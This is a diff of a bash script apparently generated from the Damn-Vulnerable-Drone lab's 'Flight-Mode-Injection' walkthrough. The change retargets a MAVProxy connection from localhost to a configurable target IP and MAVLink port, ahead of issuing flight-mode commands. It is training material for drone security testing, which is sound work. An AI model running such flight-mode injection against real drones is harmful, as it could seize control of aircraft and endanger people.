@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Flight-Mode-Injection.md
-# Created: 2025-11-23 15:43:26
+# Created: 2025-11-23 16:46:38
 # NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
 set -euo pipefail
 
@@ -22,7 +22,7 @@ log "[BLOCK 2] type=shell"
 mavproxy.py --master=/dev/ttyUSB0 --baudrate 57600 --aircraft MyAircraft
 
 log "[BLOCK 3] type=shell"
-mavproxy.py --master=udp:127.0.0.1:14550
+mavproxy.py --master=udp:${TARGET_IP}:${PORT_MAVLINK}
 
 log "[BLOCK 4] type=shell"
 mode
